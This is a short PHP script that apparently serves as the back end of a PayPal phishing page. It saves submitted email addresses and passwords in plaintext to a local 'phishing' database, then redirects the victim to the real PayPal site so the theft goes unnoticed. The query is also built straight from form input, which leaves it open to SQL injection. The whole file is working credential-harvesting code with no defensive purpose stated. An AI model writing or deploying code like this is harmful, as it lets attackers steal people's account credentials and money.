<?php
// Database connection details
$servername = "127.0.0.1"; // Because you're running locally
$username = "root";        // Default username for XAMPP
$password = "";            // Default password for XAMPP is empty
$dbname = "phishing";   // The name of the database you created

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Get the form input
$email = $_POST['email'];
$password = $_POST['password'];

// Obfuscate the password slightly before storing
//$obfuscated_password = substr($password, 0, 2) . str_repeat('*', strlen($password) - 2);

// Insert the email and obfuscated password into the database
$sql = "INSERT INTO credentials (email, password) VALUES ('$email', '$password')";

if ($conn->query($sql) === TRUE) {
    header("Location: https://www.paypal.com");
    exit();
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

// Close the connection
$conn->close();
?>
